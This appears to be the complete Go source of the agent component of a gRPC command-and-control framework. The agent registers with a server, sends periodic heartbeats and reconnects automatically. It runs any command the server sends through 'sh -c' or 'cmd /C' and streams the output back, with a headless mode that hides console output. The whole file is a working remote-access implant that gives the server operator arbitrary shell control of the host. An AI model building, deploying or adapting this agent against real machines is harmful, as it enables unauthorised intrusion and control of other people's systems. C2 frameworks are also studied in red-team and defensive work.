package main

import (
	"bufio"
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"sync"
	"syscall"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/creack/pty"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/status"
)

var (
	sessionMu    sync.RWMutex
	agentID      string
	agentClient  pb.AgentServiceClient
	outputClient pb.OutputServiceClient
	startTime    = time.Now()
	headlessMode bool
)

var errHostnameAlreadyExists = errors.New("hostname already exists")

func main() {
	serverAddr := flag.String("server", "localhost:50051", "gRPC server address")
	logFile := flag.String("log-file", "", "optional log file path")
	flag.BoolVar(&headlessMode, "headless", false, "run without interactive stdout output")
	flag.Parse()

	configureLogging(*logFile)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalf("hostname error: %v", err)
	}

	for {
		if ctx.Err() != nil {
			return
		}

		err := runAgentSession(ctx, *serverAddr, hostname)
		if ctx.Err() != nil {
			return
		}
		if errors.Is(err, errHostnameAlreadyExists) {
			agentLog("[agent] %v", err)
			return
		}
		if err != nil {
			agentLog("[agent] %v", err)
		}

		agentLog("[agent] reconnecting to %s in 3s", *serverAddr)
		select {
		case <-ctx.Done():
			return
		case <-time.After(3 * time.Second):
		}
	}
}

func runAgentSession(ctx context.Context, serverAddr, hostname string) error {
	dialCtx, cancelDial := context.WithTimeout(ctx, 5*time.Second)
	defer cancelDial()

	conn, err := grpc.DialContext(
		dialCtx,
		serverAddr,
		grpc.WithTransportCredentials(insecure.NewCredentials()),
		grpc.WithBlock(),
	)
	if err != nil {
		return fmt.Errorf("connect error: %w", err)
	}
	defer conn.Close()

	agentServiceClient := pb.NewAgentServiceClient(conn)
	heartbeatClient := pb.NewHeartbeatServiceClient(conn)
	taskClient := pb.NewTaskServiceClient(conn)
	outputServiceClient := pb.NewOutputServiceClient(conn)

	registerCtx, cancelRegister := context.WithTimeout(ctx, 5*time.Second)
	defer cancelRegister()

	reg, err := agentServiceClient.Register(registerCtx, &pb.RegisterRequest{
		Hostname: hostname,
		Os:       runtime.GOOS,
		Ip:       "127.0.0.1",
	})
	if err != nil {
		if status.Code(err) == codes.AlreadyExists {
			return fmt.Errorf("%w: host %q is already registered", errHostnameAlreadyExists, hostname)
		}
		return fmt.Errorf("register error for host %q: %w", hostname, err)
	}

	sessionMu.Lock()
	agentID = reg.GetAgentId()
	agentClient = agentServiceClient
	outputClient = outputServiceClient
	sessionMu.Unlock()

	agentLog("[agent] %s", reg.GetMessage())
	defer clearSession()

	sessionCtx, cancelSession := context.WithCancelCause(ctx)
	defer cancelSession(nil)
	defer func() {
		if errors.Is(context.Cause(sessionCtx), context.Canceled) {
			unregisterCurrentAgent()
		}
	}()

	go startHeartbeat(sessionCtx, cancelSession, heartbeatClient, reg.GetAgentId())
	go startTaskListener(sessionCtx, cancelSession, taskClient, reg.GetAgentId())

	<-sessionCtx.Done()
	cause := context.Cause(sessionCtx)
	if cause == nil || errors.Is(cause, context.Canceled) {
		return nil
	}
	return cause
}

func startHeartbeat(ctx context.Context, cancel context.CancelCauseFunc, client pb.HeartbeatServiceClient, agentID string) {
	stream, err := client.SendHeartbeat(ctx)
	if err != nil {
		cancel(fmt.Errorf("server connection lost: heartbeat stream error: %w", err))
		return
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			summary, err := stream.CloseAndRecv()
			if err != nil {
				if context.Cause(ctx) == nil {
					cancel(fmt.Errorf("server connection lost: heartbeat close error: %w", err))
				}
				return
			}
			agentLog("[agent] Heartbeat summary: received=%d last_status=%s", summary.GetTotalReceived(), summary.GetLastStatus())
			return
		case <-ticker.C:
			if err := stream.Send(&pb.HeartbeatRequest{
				AgentId:   agentID,
				Status:    "alive",
				Timestamp: time.Now().UnixMilli(),
			}); err != nil {
				cancel(fmt.Errorf("server connection lost: heartbeat send error: %w", err))
				return
			}
		}
	}
}

func startTaskListener(ctx context.Context, cancel context.CancelCauseFunc, client pb.TaskServiceClient, agentID string) {
	stream, err := client.ReceiveTasks(ctx, &pb.TaskRequest{AgentId: agentID})
	if err != nil {
		cancel(fmt.Errorf("server connection lost: task stream error: %w", err))
		return
	}

	for {
		task, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			cancel(fmt.Errorf("server connection lost: task receive error: %w", err))
			return
		}
		go executeTask(task)
	}
}

func executeTask(task *pb.Task) {
	command := task.GetCommand()
	args := task.GetArgs()
	agentID, _, outputClient := currentSession()

	stream, err := outputClient.SendOutput(context.Background())
	if err != nil {
		log.Printf("[agent] output stream error: %v", err)
		return
	}

	sendChunk := func(chunk string) {
		if err := stream.Send(&pb.OutputChunk{
			TaskId:  task.GetTaskId(),
			AgentId: agentID,
			Line:    chunk,
		}); err != nil {
			log.Printf("[agent] output send error: %v", err)
		}
	}

	// Check built-ins
	switch command {
	case "sysinfo":
		var mem runtime.MemStats
		runtime.ReadMemStats(&mem)
		info := []string{
			fmt.Sprintf("Hostname: %s", hostnameOrUnknown()),
			fmt.Sprintf("Platform: %s", runtime.GOOS),
			fmt.Sprintf("Arch: %s", runtime.GOARCH),
			fmt.Sprintf("CPUs: %d", runtime.NumCPU()),
			fmt.Sprintf("RAM total: %d MB", bToMB(mem.Sys)),
			fmt.Sprintf("RAM free: %d MB", bToMB(mem.Frees)),
			fmt.Sprintf("Uptime: %s", time.Since(startTime).Truncate(time.Second)),
		}
		for _, line := range info {
			sendChunk(line + "\n")
		}
	case "kill":
		sendChunk("Shutting down agent. Goodbye.\n")
		if _, err := stream.CloseAndRecv(); err != nil {
			log.Printf("[agent] output close error: %v", err)
		}
		unregisterCurrentAgent()
		os.Exit(0)
	default:
		// Execute real command
		fullCommand := command
		if args != "" {
			fullCommand += " " + args
		}

		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", fullCommand)
		} else {
			cmd = exec.Command("sh", "-c", fullCommand)
		}

		if runtime.GOOS == "windows" {
			runWithPipe(cmd, sendChunk)
		} else {
			runWithPTY(cmd, sendChunk)
		}
	}

	if _, err := stream.CloseAndRecv(); err != nil {
		log.Printf("[agent] output close error: %v", err)
	}
}

func currentSession() (string, pb.AgentServiceClient, pb.OutputServiceClient) {
	sessionMu.RLock()
	defer sessionMu.RUnlock()
	return agentID, agentClient, outputClient
}

func clearSession() {
	sessionMu.Lock()
	defer sessionMu.Unlock()
	agentID = ""
	agentClient = nil
	outputClient = nil
}

func unregisterCurrentAgent() {
	agentID, agentClient, _ := currentSession()
	if agentID == "" || agentClient == nil {
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	if _, err := agentClient.Unregister(ctx, &pb.UnregisterRequest{AgentId: agentID}); err != nil {
		log.Printf("[agent] unregister error: %v", err)
		return
	}

	clearSession()
}

func runWithPipe(cmd *exec.Cmd, sendChunk func(string)) {
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		sendChunk(fmt.Sprintf("Error creating stdout pipe: %v\n", err))
		return
	}

	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		sendChunk(fmt.Sprintf("Error starting command: %v\n", err))
		return
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		sendChunk(scanner.Text() + "\n")
	}
	if err := scanner.Err(); err != nil {
		sendChunk(fmt.Sprintf("Error reading command output: %v\n", err))
	}
	if err := cmd.Wait(); err != nil {
		sendChunk(fmt.Sprintf("Command exited with error: %v\n", err))
	}
}

func runWithPTY(cmd *exec.Cmd, sendChunk func(string)) {
	if cmd.Env == nil {
		cmd.Env = os.Environ()
	}
	cmd.Env = append(cmd.Env, "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		sendChunk(fmt.Sprintf("Error starting command: %v\n", err))
		return
	}
	defer func() { _ = ptmx.Close() }()

	buf := make([]byte, 1024)
	for {
		n, err := ptmx.Read(buf)
		if n > 0 {
			sendChunk(string(buf[:n]))
		}
		if err != nil {
			if err == io.EOF || errors.Is(err, syscall.EIO) {
				break
			}
			sendChunk(fmt.Sprintf("\nError reading command output: %v\n", err))
			break
		}
	}

	if err := cmd.Wait(); err != nil {
		sendChunk(fmt.Sprintf("\nCommand exited with error: %v\n", err))
	}
}

func hostnameOrUnknown() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func bToMB(v uint64) uint64 {
	return v / 1024 / 1024
}

func configureLogging(logFile string) {
	if logFile == "" {
		return
	}

	f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644)
	if err != nil {
		log.Fatalf("open log file: %v", err)
	}
	log.SetOutput(f)
}

func agentLog(format string, args ...any) {
	if headlessMode {
		log.Printf(format, args...)
		return
	}
	fmt.Printf(format+"\n", args...)
}
